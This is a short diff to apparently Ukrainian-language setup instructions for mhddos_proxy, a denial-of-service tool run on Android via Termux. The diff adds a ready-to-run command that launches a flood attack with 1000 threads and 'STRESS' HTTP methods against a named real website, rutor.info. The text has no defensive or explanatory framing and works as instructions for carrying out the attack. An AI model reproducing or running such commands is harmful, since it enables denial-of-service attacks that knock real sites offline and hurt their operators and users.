@@ -21,5 +21,7 @@ pip install -r termux_requirements.txt
 Заходимо в папку mhddos_proxy
 ```termux
 cd ~/storage/shared/mhddos_proxy
+TERMUX=1 bash runner.sh python http://rutor.info/ -t 1000 --rpc 1000 --http-methods GET STRESS
+```
 
   
